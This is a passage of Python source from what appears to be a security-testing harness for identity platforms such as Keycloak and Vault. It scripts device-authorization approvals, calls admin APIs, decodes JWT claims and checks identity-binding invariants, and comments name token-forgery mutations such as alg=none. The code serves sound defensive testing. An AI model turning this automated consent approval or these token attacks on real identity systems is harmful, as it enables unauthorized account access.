        """Extract claims from a JWT access token and store as captures.

        Keycloak's userinfo endpoint doesn't return realm_access or groups
        by default, but they ARE in the JWT. Parse the token to fill these.
        """
        if not token or "." not in token:
            return
        try:
            import base64
            payload = token.split(".")[1]
            payload += "=" * (4 - len(payload) % 4)
            claims = json.loads(base64.b64decode(payload))

            prefix = auth_as  # e.g. "user_A"

            # realm_access.roles → policies (abstract suffix)
            roles = claims.get("realm_access", {}).get("roles", [])
            if roles and f"{prefix}_policies" not in self.captures:
                self.captures[f"{prefix}_policies"] = roles
                logger.info(f"    JWT-CAPTURE: {prefix}_policies = {roles}")

            # groups claim (if present)
            groups = claims.get("groups", [])
            if groups and f"{prefix}_groups" not in self.captures:
                self.captures[f"{prefix}_groups"] = groups
                logger.info(f"    JWT-CAPTURE: {prefix}_groups = {groups}")

            # sub → entity_id
            sub = claims.get("sub")
            if sub and f"{prefix}_entity_id" not in self.captures:
                self.captures[f"{prefix}_entity_id"] = sub
                logger.info(f"    JWT-CAPTURE: {prefix}_entity_id = {sub}")

            # preferred_username → display_name
            username = claims.get("preferred_username")
            if username and f"{prefix}_display_name" not in self.captures:
                self.captures[f"{prefix}_display_name"] = username
                logger.info(f"    JWT-CAPTURE: {prefix}_display_name = {username}")

            # email
            email = claims.get("email")
            if email and f"{prefix}_email" not in self.captures:
                self.captures[f"{prefix}_email"] = email
                logger.info(f"    JWT-CAPTURE: {prefix}_email = {email}")

        except Exception as e:
            logger.debug(f"Failed to parse JWT claims: {e}")

    def _resolve_keycloak_user_id(self, params: dict) -> Optional[str]:
        """Resolve Keycloak user UUID from username via admin API."""
        realm = params.get("realm", "valence-test")
        username = params.get("username")
        if not username:
            return None
        try:
            headers = {"Content-Type": "application/json"}
            auth_value = self._resolve_admin_token(
                self.profile.admin_auth.get("value", "")
            )
            headers[self.profile.admin_auth.get("header", "Authorization")] = auth_value
            resp = self.session.get(
                f"{self.base_url}/admin/realms/{realm}/users?username={username}&exact=true",
                headers=headers,
            )
            if resp.ok:
                users = resp.json()
                if users:
                    uid = users[0]["id"]
                    logger.info(f"    Resolved user_id for '{username}': {uid}")
                    return uid
        except Exception as e:
            logger.error(f"Failed to resolve user_id for '{username}': {e}")
        return None

    def _resolve_keycloak_role_representation(self, params: dict) -> Optional[list]:
        """Fetch Keycloak role representation (with id) for role assignment."""
        realm = params.get("realm", "valence-test")
        role_name = params.get("role_name")

        # Fallback: check captures for role_id + role_name from a prior get_role event
        if not role_name:
            # Look for any captured role_name (e.g., "elevated_ops_role_name" → "elevated-ops")
            for cap_key, cap_val in self.captures.items():
                if cap_key.endswith("_role_name") and cap_val and str(cap_val) not in ("None", "null"):
                    role_name = str(cap_val)
                    logger.info(f"    ROLE: inferred role_name='{role_name}' from capture '{cap_key}'")
                    break
            # Also check top-level "role_name" capture from get_role response_map auto-capture
            if not role_name:
                cap_role = self.captures.get("role_name")
                if cap_role and str(cap_role) not in ("None", "null"):
                    role_name = str(cap_role)
                    logger.info(f"    ROLE: inferred role_name='{role_name}' from captures['role_name']")

        if not role_name:
            logger.warning("    ROLE: no role_name in params or captures — cannot resolve role representation")
            return None

        # Check if we already have role_id + role_name from captures (skip API call)
        for cap_key, cap_val in self.captures.items():
            if cap_key.endswith("_role_id") and cap_val and str(cap_val) not in ("None", "null"):
                # Find matching role_name capture
                name_key = cap_key.replace("_role_id", "_role_name")
                cap_name = self.captures.get(name_key)
                if cap_name and str(cap_name) == role_name:
                    logger.info(f"    ROLE: using cached role representation from captures: id={cap_val}, name={role_name}")
                    return [{"id": str(cap_val), "name": role_name}]

        try:
            headers = {"Content-Type": "application/json"}
            auth_value = self._resolve_admin_token(
                self.profile.admin_auth.get("value", "")
            )
            headers[self.profile.admin_auth.get("header", "Authorization")] = auth_value
            resp = self.session.get(
                f"{self.base_url}/admin/realms/{realm}/roles/{role_name}",
                headers=headers,
            )
            if resp.ok:
                role = resp.json()
                logger.info(f"    Resolved role '{role_name}': id={role.get('id')}")
                return [{"id": role["id"], "name": role["name"]}]
        except Exception as e:
            logger.error(f"Failed to resolve role '{role_name}': {e}")
        return None

    # ------------------------------------------------------------------
    # Parameter resolution
    # ------------------------------------------------------------------

    def _handle_approve_device(self, event) -> "EventResult":
        """Drive the Keycloak OAuth 2.0 device-authorization user-approval flow.

        Params (after {{var}} resolution):
          - verification_uri_complete: the device verification URL (with user_code)
          - username / password: end-user credentials to log in and approve

        A single persistent browser session is reused across multiple
        approve_device events so the user's SSO session accumulates client
        sessions for every approved client (this is what makes cross-client
        device-code redemption observable). Returns success=True with
        http_status 200 when the device is approved.
        """
        import html as _html
        from urllib.parse import urljoin as _urljoin

        p = self._resolve_params(event.params)
        vuri = p.get("verification_uri_complete") or p.get("vuri") or ""
        username = p.get("username", "")
        password = p.get("password", "")
        if not vuri:
            return EventResult(event=event, http_status=0, success=False,
                               error="approve_device requires verification_uri_complete")

        # Lazy per-executor browser session (SSO carried across approvals).
        if getattr(self, "_device_browser", None) is None:
            self._device_browser = requests.Session()
        s = self._device_browser

        try:
            r = s.get(vuri, timeout=30)
            approved = False
            for _ in range(6):
                m = re.search(r'<form[^>]*action="([^"]+)"[^>]*>(.*?)</form>',
                              r.text, re.S | re.I)
                if not m:
                    approved = ("success" in r.text.lower()
                                or "device login" in r.text.lower())
                    break
                action = _html.unescape(m.group(1))
                body = m.group(2)
                data = {}
                for name, val in re.findall(r'name="([^"]+)"[^>]*value="([^"]*)"', body):
                    data[name] = _html.unescape(val)
                url = _urljoin(r.url, action)
                low = r.text.lower()
                if 'type="password"' in low:
                    data["username"] = username
                    data["password"] = password
                    data.pop("cancel", None)
                elif 'name="accept"' in low:
                    # Approve only: never submit the cancel/deny button.
                    data.pop("cancel", None)
                    data["accept"] = "Yes"
                r = s.post(url, data=data, timeout=30, allow_redirects=True)
                if "error=access_denied" in r.url:
                    approved = False
                    break
                if ("success" in r.text.lower()
                        or "device login successful" in r.text.lower()
                        or ("device/status" in r.url and "error" not in r.url)):
                    approved = True
                    break
            logger.info(f"    APPROVE_DEVICE: approved={approved} (user={username})")
            status = 200 if approved else 400
            response_body = {"approved": approved}
            captured = {}
            for var_name, accessor in event.captures.items():
                if accessor in ("http_status", "_http_status"):
                    value = status
                elif accessor == "approved":
                    value = approved
                else:
                    value = self._extract_accessor_or_path(response_body, accessor, p)
                captured[var_name] = value
                if value is not None or var_name not in self.captures:
                    self.captures[var_name] = value
            return EventResult(event=event, http_status=status,
                               success=approved,
                               response_body=response_body,
                               captured_values=captured)
        except Exception as e:
            return EventResult(event=event, http_status=0, success=False,
                               error=f"approve_device failed: {e}")

    def _resolve_params(self, params: dict) -> dict:
        """Replace {{variable}} references with captured values."""
        resolved = {}
        for key, value in params.items():
            if isinstance(value, str) and "{{" in value:
                for var_name, var_value in self.captures.items():
                    value = value.replace(
                        f"{{{{{var_name}}}}}",
                        str(var_value) if var_value is not None else ""
                    )
                # Also resolve {{now_epoch}}-style time templates
                m = _EPOCH_TEMPLATE_RE.fullmatch(value.strip())
                if m:
                    import time as _t
                    _n = int(_t.time())
                    value = _n + int(m.group(1) or 0) - int(m.group(2) or 0)
                resolved[key] = value
            elif isinstance(value, dict):
                resolved[key] = self._resolve_params(value)
            elif isinstance(value, list):
                resolved[key] = [
                    self._resolve_params({"_": v})["_"] if isinstance(v, (str, dict)) else v
                    for v in value
                ]
            else:
                resolved[key] = value
        return resolved

    # ------------------------------------------------------------------
    # JSON path extraction
    # ------------------------------------------------------------------

    def _extract_json_path(self, obj: dict, path: str) -> Any:
        """Extract a value from a nested dict/list using dot notation.

        Handles array responses: if the top-level object is a list, extracts
        from the first element.  This is common for REST APIs that return
        ``[{user}]`` arrays (e.g. KC ``/admin/realms/{r}/users?username=X``).
        """
        # "$" or empty string means "return the entire response body"
        if path in ("$", "", "_full_response"):
            return obj
        current = obj
        # Auto-unwrap top-level array: [{"id": ...}] → {"id": ...}
        if isinstance(current, list) and len(current) > 0:
            current = current[0]
        for part in path.split("."):
            if current is None:
                return None
            m = re.match(r'^(\w+)\[(\d+)\]$', part)
            if m:
                key, idx = m.group(1), int(m.group(2))
                current = current.get(key, []) if isinstance(current, dict) else []
                if isinstance(current, list) and idx < len(current):
                    current = current[idx]
                else:
                    return None
            elif isinstance(current, dict):
                current = current.get(part)
            elif isinstance(current, list) and len(current) > 0:
                # Mid-path array: try extracting from first element
                current = current[0].get(part) if isinstance(current[0], dict) else None
            else:
                return None
        return current

    def _extract_accessor_or_path(self, response_body: dict, json_path: str, params: dict) -> Any:
        """Handle accessor extraction like 'jwt/.accessor' specially."""
        m = re.match(r'^([^/]+)/\.accessor$', json_path)
        if m:
            mount_key = m.group(1)
            data = response_body.get("data", response_body)
            entry = data.get(f"{mount_key}/") or data.get(mount_key)
            if entry and isinstance(entry, dict):
                return entry.get("accessor")
            return None
        return self._extract_json_path(response_body, json_path)

    # ------------------------------------------------------------------
    # ------------------------------------------------------------------

    def _apply_body_transform(self, transform: dict, body: dict,
                              resolved_params: dict, event) -> Any:
        """Apply a config-driven body transformation from endpoint.body_transform.

        Supported transform types:
          - role_repr_lookup: GET a role by name, send as JSON array
          - wrap_field: wrap a field value into a structured object
          - defaults: merge default values into body
        """
        t_type = transform.get("type", "")

        if t_type == "role_repr_lookup":
            # Fetch full role representation via admin API and send as array
            if not resolved_params.get("role_name") and isinstance(body, dict) and body.get("role_name"):
                resolved_params["role_name"] = body["role_name"]
            role_repr = self._resolve_keycloak_role_representation(resolved_params)
            if role_repr:
                return role_repr
            return body

        elif t_type == "wrap_field":
            # Wrap a param value into a structured body field
            field_name = transform.get("field", "")
            target_key = transform.get("target_key", field_name)
            wrapper_template = transform.get("wrapper", {})
            target_format = transform.get("target_format", "single")

            if field_name in resolved_params and target_key not in body:
                wrapper = {}
                for k, v in wrapper_template.items():
                    if isinstance(v, str) and v.startswith("{") and v.endswith("}"):
                        param_name = v[1:-1]
                        wrapper[k] = resolved_params.get(param_name, v)
                    else:
                        wrapper[k] = v
                if target_format == "array":
                    body[target_key] = [wrapper]
                else:
                    body[target_key] = wrapper
            return body

        elif t_type == "defaults":
            # Merge default key-value pairs into body if not present
            for k, v in transform.get("values", {}).items():
                if k not in body:
                    body[k] = v
            return body

        else:
            logger.warning(f"    BODY-TRANSFORM: unknown type '{t_type}'")
            return body

    # ------------------------------------------------------------------
    # LoginContext building
    # ------------------------------------------------------------------

    def _build_universal_contexts(self, events, event_results) -> list:
        """Profile mode: build UniversalLoginContext from captured data.

        Uses ABSTRACT SUFFIXES — same names that _captures_from_profile stores.
        These are deterministic and platform-independent.
        """
        from src.stateful.models import UniversalLoginContext

        # When a role uses user_claim/identity_claim != "sub", sent_identity must
        # be the value of that claim (not sub) to match the granted alias name.
        role_identity_claim_map: dict[str, str] = {}
        for ev in events:
            if ev.event_type in ("create_auth_role", "setup_jwt_role"):
                rname = ev.params.get("role_name") or ev.params.get("name") or ev.params.get("role", "")
                ic = ev.params.get("identity_claim") or ev.params.get("user_claim")
                if rname and ic:
                    role_identity_claim_map[rname] = ic

        contexts = []

        for event, result in zip(events, event_results):
            if not event.event_type.startswith("login_"):
                continue

            prefix = event.auth_as
            params = event.params

            # --- Sent side (from event params) ---
            login_type = self._infer_login_type(event)
            sent_identity = self._resolve_sent_identity(event)
            # alias name — so sent_identity must also be the email, not the sub.
            _login_role = params.get("role", "") or params.get("role_name", "")
            if _login_role in role_identity_claim_map and "jwt_claims" in params:
                _identity_claim = role_identity_claim_map[_login_role]
                _jwt_claims = params.get("jwt_claims", {})
                sent_identity = str(_jwt_claims.get(_identity_claim, _jwt_claims.get("sub", "")))
            sent_audience = self._resolve_sent_audience(event)

            # --- Configured side (from setup events) ---
            configured_permissions = self._resolve_configured_permissions(events)
            # Use the role from the login event to look up only that role's constraints,
            # avoiding cross-role contamination in multi-mount/multi-role sequences.
            login_role = params.get("role", "") or params.get("role_name", "")
            # When role is empty (default_role path), try to resolve the actual role
            if not login_role:
                _meta = self.captures.get(f"{prefix}_metadata") or {}
                login_role = _meta.get("role", "") if isinstance(_meta, dict) else ""
            configured_constraints = self._resolve_configured_constraints(events, role_name=login_role)

            # --- Granted side (from captures populated by verify events) ---
            # Use ABSTRACT SUFFIXES — same names that _captures_from_profile stores.
            # The platform-specific part (JSON paths like "sub" vs "preferred_username")
            # is already resolved by _captures_from_profile when it populated self.captures.
            # Prefer identity_name (login username) over display_name (human-readable)
            # for identity binding checks — sent_identity is the username, so granted
            # should also be the username to avoid false name-vs-displayName mismatches.
            granted_identity = str(self.captures.get(f"{prefix}_identity_name", "") or "")
            if not granted_identity:
                granted_identity = str(self.captures.get(f"{prefix}_display_name", "") or "")
            granted_identity_id = str(self.captures.get(f"{prefix}_entity_id", "") or "")
            granted_permissions = self.captures.get(f"{prefix}_policies") or []
            granted_groups = self.captures.get(f"{prefix}_groups") or []
            granted_metadata = self.captures.get(f"{prefix}_meta") or {}
            granted_email = str(self.captures.get(f"{prefix}_email", "") or "")

            # Fallback: if display_name is empty but email is available, use email
            if not granted_identity and granted_email:
                granted_identity = granted_email

            ctx = UniversalLoginContext(
                login_type=login_type,
                sent_identity=sent_identity,
                sent_audience=sent_audience,
                login_params=dict(params),
                auth_as=prefix,
                configured_permissions=configured_permissions,
                configured_constraints=configured_constraints,
                login_success=result.success,
                http_status=result.http_status,
                granted_identity=granted_identity,
                granted_identity_id=granted_identity_id,
                granted_permissions=list(granted_permissions) if isinstance(granted_permissions, list) else [],
                granted_groups=list(granted_groups) if isinstance(granted_groups, list) else [],
                granted_metadata=dict(granted_metadata) if isinstance(granted_metadata, dict) else {},
                captured=dict(self.captures),
            )
            contexts.append(ctx)

        return contexts

    def _infer_login_type(self, event) -> str:
        """Infer login type from event params. No platform hardcoding."""
        p = event.params
        if "jwt_claims" in p:
            return "jwt"
        if "username" in p and "password" in p:
            return "password"
        if "saml_response" in p or "SAMLResponse" in p:
            return "saml"
        return "unknown"

    def _resolve_sent_identity(self, event) -> str:
        """Extract the claimed identity from login params. No platform hardcoding."""
        p = event.params
        # JWT: identity comes from claims
        if "jwt_claims" in p:
            # user_claim field tells us which claim is the identity
            user_claim = p.get("user_claim_field", "sub")
            return str(p["jwt_claims"].get(user_claim, ""))
        # Password: identity is the username
        if "username" in p:
            return str(p["username"])
        # SAML: identity is the NameID
        if "saml_nameid" in p:
            return str(p["saml_nameid"])
        return ""

    def _resolve_sent_audience(self, event) -> str:
        """Extract audience from login params."""
        p = event.params
        if "jwt_claims" in p:
            aud = p["jwt_claims"].get("aud", "")
            return str(aud) if not isinstance(aud, list) else str(aud[0]) if aud else ""
        return ""

    def _resolve_configured_permissions(self, events) -> list:
        """Extract configured permissions from setup events.

        For Vault: permissions come from create_auth_role's token_policies.
        For Keycloak: permissions come from roles ASSIGNED to users (not just created).
        Generic: any 'policies' param in setup events.
        """
        permissions = []
        assigned_roles = set()  # Track role assignment events

        # First pass: find role assignments
        for event in events:
            p = event.params
            if event.event_type in ("assign_role", "assign_user_role") and "role_name" in p:
                assigned_roles.add(p["role_name"])
            # Also look for role arrays in assignment events
            if event.event_type.startswith("assign_") and "roles" in p:
                for r in (p["roles"] if isinstance(p["roles"], list) else [p["roles"]]):
                    if isinstance(r, dict) and "name" in r:
                        assigned_roles.add(r["name"])
                    elif isinstance(r, str):
                        assigned_roles.add(r)

        # Second pass: extract permissions
        for event in events:
            p = event.params
            if "token_policies" in p:
                permissions.extend(p["token_policies"])
            if event.event_type == "create_policy" and "role_name" in p:
                if assigned_roles:
                    # If we tracked any assignments, only count assigned roles
                    if p["role_name"] in assigned_roles:
                        permissions.append(p["role_name"])
                else:
                    # If no assignment events found, fall back to counting all created roles
                    # (backwards compat for sequences that don't use explicit assignment)
                    permissions.append(p["role_name"])
            # Generic: any 'policies' param in setup events
            if event.event_type.startswith(("setup_", "create_")) and \
               not event.event_type.startswith("create_user") and \
               not event.event_type == "create_policy":
                if "policies" in p:
                    policies = p["policies"]
                    permissions.extend(policies if isinstance(policies, list) else [policies])

        return permissions

    def _resolve_configured_constraints(self, events, role_name: str = "") -> dict:
        """Extract configured constraints from setup events.

        If role_name is given, only collect constraints from the matching role
        config event. This prevents multi-mount sequences from mixing constraints
        across roles (e.g. jwtA's bound_audiences bleeding into jwtB's login check).
        If role_name is provided but no matching config is found, returns empty
        (safer than silently using an unrelated role's constraints).
        If role_name is empty, collects from all role config events (legacy behaviour).
        """
        constraints = {}
        for event in events:
            p = event.params
            if event.event_type in ("setup_jwt_role", "create_auth_role"):
                event_role = p.get("role_name") or p.get("name")
                if role_name and event_role != role_name:
                    continue
                for key in ("bound_audiences", "audience_restriction",
                           "bound_claims", "claim_constraints", "bound_subject"):
                    if key in p and p[key]:
                        constraints[key] = p[key]
        return constraints

    def _find_role_config(self, events: list, role_name: str) -> dict:
        """Search events for a role setup matching role_name.

        Also falls back to captured state if no matching event is found,
        since stateful campaigns may capture role config via read_role_config.
        """
        # Search events first
        _role_event_types = {
            "setup_jwt_role", "create_auth_role", "configure_jwt_role",
            "create_jwt_role", "configure_jwt_validation",
        }
        for event in events:
            if event.event_type in _role_event_types:
                event_rn = event.params.get("role_name") or event.params.get("name")
                if event_rn == role_name or not role_name:
                    return dict(event.params)

        # Fallback: extract from captured state (read_role_config captures)
        _config_fields = {
            "bound_issuer", "bound_audiences", "bound_claims_type",
            "bound_claims", "groups_claim", "user_claim", "token_policies",
            "bound_subject", "claim_constraints", "claim_constraint_type",
        }
        role_config = {}
        for key, val in self.captures.items():
            if val is not None:
                for field in _config_fields:
                    if key == field or key.endswith(f"_{field}"):
                        role_config[field] = val
                        break
        return role_config

    # ------------------------------------------------------------------
    # Ensure verify captures
    # ------------------------------------------------------------------

    def _captures_from_profile(self, op_name: str, prefix: str,
                                abstract_to_suffix: dict) -> dict:
        """Build captures dict from profile's response_map for a verify operation.

        Args:
            op_name: Abstract operation name (e.g. 'verify_granted_identity')
            prefix: Variable name prefix (e.g. 'user_A')
            abstract_to_suffix: Maps abstract response_map key → capture var suffix
                                 (e.g. 'identity_id' → 'entity_id')

        Returns:
            Dict of {f'{prefix}_{suffix}': json_path} if profile endpoint exists,
            empty dict otherwise (caller should use hardcoded fallback).
        """
        if not (self.mode == "profile" and self.profile):
            return {}
        endpoint = self.profile.get_endpoint(self.protocol, op_name)
        if not (endpoint and endpoint.response_map):
            return {}
        captures = {}
        for abstract_key, suffix in abstract_to_suffix.items():
            json_path = endpoint.response_map.get(abstract_key)
            if json_path:
                captures[f"{prefix}_{suffix}"] = json_path
        return captures

    def _ensure_verify_captures(self, seq: EventSequence) -> EventSequence:
        """Fill in captures for verify events if none provided.

        This ensures InvariantVerifier always has the data it needs.
        """
        for event in seq.events:
            if event.event_type == "verify_token_self" and not event.captures:
                user = event.auth_as.replace("session_", "")
                event.captures = {
                    f"{user}_policies": "data.policies",
                    f"{user}_identity_policies": "data.identity_policies",
                    f"{user}_entity_id": "data.entity_id",
                    f"{user}_meta": "data.meta",
                    f"{user}_num_uses": "data.num_uses",
                }
            elif event.event_type == "verify_entity" and not event.captures:
                prefix = event.auth_as if event.auth_as != "admin" else "verified"
                event.captures = {
                    f"{prefix}_entity_name": "data.name",
                    f"{prefix}_entity_aliases": "data.aliases",
                    f"{prefix}_entity_policies": "data.policies",
                    f"{prefix}_entity_group_ids": "data.group_ids",
                }
            # Profile mode event names — read JSON paths from profile response_map.
            # ALWAYS override LLM-provided captures because LLM uses abstract keys
            # (e.g. "identity_id") while the executor needs actual JSON paths (e.g. "data.id").
            elif event.event_type == "verify_granted_identity":
                user = event.auth_as.replace("session_", "")
                # Preferred: read JSON paths from profile (platform-agnostic)
                profile_captures = self._captures_from_profile(
                    "verify_granted_identity",
                    user,
                    {   # abstract_key → capture_suffix mapping
                        "identity_id": "entity_id",
                        "identity_name": "identity_name",
                        "display_name": "display_name",
                        "granted_policies": "policies",
                        "identity_policies": "identity_policies",
                        "metadata": "meta",
                        "num_uses": "num_uses",
                        "email": "email",
                        "groups": "groups",
                    }
                )
                if profile_captures:
                    event.captures = profile_captures
                elif self.mode == "legacy":
                    event.captures = {
                        f"{user}_policies": "data.policies",
                        f"{user}_identity_policies": "data.identity_policies",
                        f"{user}_entity_id": "data.entity_id",
                        f"{user}_meta": "data.meta",
                        f"{user}_num_uses": "data.num_uses",
                    }
                else:
                    # Profile mode but no response_map — log warning, leave empty
                    logger.warning(f"No captures for {event.event_type} on {self.profile.name}")
                    event.captures = {}
            elif event.event_type == "verify_entity_details":
                prefix = event.auth_as if event.auth_as != "admin" else "verified"
                profile_captures = self._captures_from_profile(
                    "verify_entity_details",
                    prefix,
                    {   # abstract_key → capture_suffix mapping
                        "entity_name": "entity_name",
                        "entity_id": "entity_id",
                        "entity_aliases": "entity_aliases",
                        "entity_policies": "entity_policies",
                        "entity_group_ids": "entity_group_ids",
                        "email": "email",
                        "enabled": "enabled",
                        "entity_groups": "entity_groups",
                    }
                )
                if profile_captures:
                    event.captures = profile_captures
                elif self.mode == "legacy":
                    event.captures = {
                        f"{prefix}_entity_name": "data.name",
                        f"{prefix}_entity_aliases": "data.aliases",
                        f"{prefix}_entity_policies": "data.policies",
                        f"{prefix}_entity_group_ids": "data.group_ids",
                    }
                else:
                    logger.warning(f"No captures for {event.event_type} on {self.profile.name}")
                    event.captures = {}
        return seq

    # ------------------------------------------------------------------
    # Cleanup
    # ------------------------------------------------------------------

    def _delete_existing_resource(self, event: Event, resolved_params: dict):
        """Delete a resource that already exists so create can be retried.

        Used when create_identity_user/create_user fails with "already exists".
        Sends the platform-appropriate delete request using admin auth.
        """
        try:
            # Map create event types to their corresponding delete event types
            delete_event_map = {
                "create_identity_user": "delete_identity_user",
                "create_user": "delete_identity_user",
                "create_auth_role": "delete_auth_role",
                "create_policy": "delete_policy",
                "create_identity_group": "delete_identity_group",
                "enable_auth_method": "cleanup_auth_method",
            }
            delete_event_type = delete_event_map.get(event.event_type)
            if not delete_event_type and event.event_type == "create_realm":
                realm = resolved_params.get("realm", "")
                if realm and realm != "master":
                    _admin_headers = {"Content-Type": "application/json"}
                    auth_header = self.profile.admin_auth.get("header", "Authorization")
                    auth_value = self.profile.admin_auth.get("value", "")
                    if "{admin_token}" in auth_value:
                        auth_value = self._resolve_admin_token(auth_value)
                    _admin_headers[auth_header] = auth_value
                    del_r = self.session.delete(f"{self.base_url}/admin/realms/{realm}", headers=_admin_headers, timeout=10)
                    logger.info(f"    RETRY: deleted realm {realm}: HTTP {del_r.status_code}")
                    return del_r.ok
                return False
            if not delete_event_type:
                return False

            delete_ep = self.profile.get_endpoint(self.protocol, delete_event_type)
            if not delete_ep:
                logger.warning(f"    RETRY: no delete endpoint for {delete_event_type}")
                return

            url = f"{self.base_url}{delete_ep.path}"
            body = {
                "owner": resolved_params.get("owner", ""),
                "name": resolved_params.get("name", resolved_params.get("username", "")),
            }

            # Use admin auth — same logic as _execute_profile_http
            uses_cookie_auth = getattr(self.profile, 'session_auth_method', 'bearer') == 'cookie'
            headers = {"Content-Type": "application/json"}
            if uses_cookie_auth:
                self._ensure_admin_session()
                http_session = self.session
            else:
                auth_header = self.profile.admin_auth.get("header", "Authorization")
                auth_value = self.profile.admin_auth.get("value", "")
                if "{admin_token}" in auth_value:
                    auth_value = self._resolve_admin_token(auth_value)
                headers[auth_header] = auth_value
                http_session = self.session

            resp = http_session.request(
                delete_ep.method.upper(), url,
                headers=headers, json=body, timeout=10,
            )
            if resp.ok:
                logger.info(f"    RETRY: deleted existing resource '{body.get('name', '?')}'")
                return True
            else:
                logger.warning(f"    RETRY: delete failed: HTTP {resp.status_code}")
                return False
        except Exception as e:
            logger.warning(f"    RETRY: delete error: {e}")
            return False

    def _register_cleanup(self, event: Event, params: dict, response: dict):
        """Track resources to clean up after sequence."""
        if self.mode == "profile":
            # Profile mode: individual resource cleanup is best-effort.
            # The profile's cleanup_auth_method endpoint handles full teardown.
            return

        et = event.event_type
        if et == "setup_jwt_role":
            mount = params.get("mount", "jwt")
            role = params.get("role_name", "")
            if role:
                self.cleanup_actions.append(("DELETE", f"/v1/auth/{mount}/role/{role}", None))
        elif et == "setup_policy":
            name = params.get("policy_name", "")
            if name and name not in ("default", "root"):
                self.cleanup_actions.append(("DELETE", f"/v1/sys/policies/acl/{name}", None))
        elif et == "setup_entity":
            eid = self._extract_json_path(response, "data.id")
            if eid:
                self.cleanup_actions.append(("DELETE", f"/v1/identity/entity/id/{eid}", None))
        elif et == "setup_group":
            gid = self._extract_json_path(response, "data.id")
            if gid:
                self.cleanup_actions.append(("DELETE", f"/v1/identity/group/id/{gid}", None))

    def _cleanup(self):
        """Best-effort cleanup of created resources."""
        # Cookie-auth platforms: ensure admin session (cookies on self.session),
        # do NOT send a broken Basic auth header.
        uses_cookie_auth = (self.mode == "profile" and self.profile
                            and getattr(self.profile, 'session_auth_method', 'bearer') == 'cookie')
        headers = {"Content-Type": "application/json"}
        if uses_cookie_auth:
            self._ensure_admin_session()
        elif self.mode == "profile" and self.profile:
            h = self.profile.admin_auth.get("header", "Authorization")
            v = self.profile.admin_auth.get("value", "")
            if "{admin_token}" in v:
                v = self._resolve_admin_token(v)
            headers[h] = v
        else:
            headers["X-Vault-Token"] = self.admin_token

        for method, path, body in reversed(self.cleanup_actions):
            try:
                url = f"{self.base_url}{path}"
                if body:
                    self.session.request(method, url, headers=headers, json=body)
                else:
                    self.session.request(method, url, headers=headers)
            except Exception:
                pass
        self.cleanup_actions = []

    # ------------------------------------------------------------------
    # Oracle checks (AssertionEngine)
    # ------------------------------------------------------------------

    def _run_oracle_checks(self, checks: list[OracleCheck]) -> list:
        """Run LLM assertion-based oracle checks against captured state.

        Baseline check support: if a check whose check_id contains "baseline"
        fails (assertion evaluates to False), all subsequent checks in the
        same sequence are marked INCONCLUSIVE. This prevents false positives
        when the testing mechanism itself cannot distinguish principals (e.g.,
        a mock IdP returning the same identity for all users).
        """
        import re as _re
        from src.models.types import Verdict, VerdictType

        verdicts = []
        baseline_failed = False

        # ── Identity diversity precondition (structural, not LLM-dependent) ──
        # For I4 (Principal Binding) testing, the authentication mechanism must
        # be able to produce distinct downstream identities for distinct upstream
        # principals. If ALL captured entity_id values are identical, the
        # mechanism lacks the expressiveness needed for I4 testing (e.g., a mock
        # connector that returns a fixed identity). This is a precondition
        # failure, not a security finding.
        #
        # Scientific justification: I4 asserts ∀(p₁≠p₂) ⇒ id(p₁)≠id(p₂).
        # Testing this requires at least two distinct id() outputs. If the
        # mechanism is a constant function, the implication is vacuously true
        # but untestable — we cannot distinguish "identities collide because
        # of a bug" from "identities collide because the mechanism always
        # returns the same value."
        i4_diversity_ok = True  # assume OK unless proven otherwise
        entity_ids = set()
        _pwd_entity_ids = set()
        _sso_entity_ids = set()
        # Build a map of auth_as → login event type from the sequence events
        _auth_as_login_type: dict[str, str] = {}
        _seq_events_for_precond = getattr(self, '_current_sequence_events', None) or []
        for _ev in _seq_events_for_precond:
            if _ev.event_type in ("saml_login",):
                _auth_as_login_type[_ev.auth_as] = "sso"
            elif _ev.event_type in ("login_with_password", "login_with_jwt"):
                _auth_as_login_type[_ev.auth_as] = "password"
        for key, val in self.captures.items():
            if key.endswith("_entity_id") and val is not None and val != "":
                entity_ids.add(str(val))
                # Classify by login type to detect cross-protocol collisions
                _user_prefix = key.rsplit("_entity_id", 1)[0]
                # Use event-based classification first, fall back to prefix heuristic
                _is_sso = (
                    _auth_as_login_type.get(_user_prefix) == "sso"
                    or _auth_as_login_type.get(f"session_{_user_prefix}") == "sso"
                    or "saml" in _user_prefix or "sso" in _user_prefix
                    or "oidc" in _user_prefix
                )
                if _is_sso:
                    _sso_entity_ids.add(str(val))
                else:
                    _pwd_entity_ids.add(str(val))
        if len(entity_ids) == 1:
            # All entity_ids are identical. BUT if there are both password and
            # SSO logins, this IS the cross-protocol collision (not a mock issue).
            _has_cross_protocol = bool(_pwd_entity_ids) and bool(_sso_entity_ids)
            if _has_cross_protocol:
                logger.info(
                    f"  [I4-PRECONDITION] Cross-protocol collision detected: "
                    f"password and SSO logins share entity_id "
                    f"({next(iter(entity_ids))[:20]}...). "
                    f"I4 diversity OK — this may indicate an identity binding issue."
                )
            else:
                i4_diversity_ok = False
                logger.info(
                    f"  [I4-PRECONDITION] Identity diversity check FAILED: "
                    f"all entity_ids resolve to the same value ({next(iter(entity_ids))[:40]}...). "
                    f"I4 assertions will be marked INCONCLUSIVE."
                )

        # ── Email diversity precondition ──
        # Same logic as entity_id diversity but for *_email captures.
        # When the authentication mechanism always returns the same email
        # (e.g., a mock connector with fixed identity), assertions that
        # compare emails across users are vacuously false — not security
        # findings.  Applies to I1/I3/I4 assertions referencing _email.
        email_diversity_ok = True
        captured_emails = set()
        for key, val in self.captures.items():
            if key.endswith("_email") and val is not None and val != "":
                captured_emails.add(str(val))
        if len(captured_emails) == 1 and len(entity_ids) <= 1:
            email_diversity_ok = False
            logger.info(
                f"  [EMAIL-PRECONDITION] Email diversity check FAILED: "
                f"all captured emails are identical ({next(iter(captured_emails))[:40]}). "
                f"Assertions comparing emails will be marked INCONCLUSIVE."
            )

        # ── Mock IDP crypto limitation precondition ──
        # The mock IDP (port 9090) always signs JWTs with the trusted key
        # regardless of mutation labels (alg=none, kid=attacker, etc.).
        # If ALL captured entity_ids are non-empty (all logins succeeded),
        # and the sequence tests I1 (proof integrity) cryptographic attacks,
        # then the mock IDP could not produce the weakened credential and
        # "should reject" assertions are structurally untestable.
        # Count non-empty entity_id captures (not distinct values — the mock
        # IDP may map all logins to the same entity). If ≥1 login produced a
        # valid entity, the mock IDP signed at least one token correctly.
        _non_empty_entity_count = sum(
            1 for k, v in self.captures.items()
            if k.endswith("_entity_id") and v is not None and str(v) != "" and str(v) != "None"
        )
        _all_logins_succeeded = _non_empty_entity_count >= 1

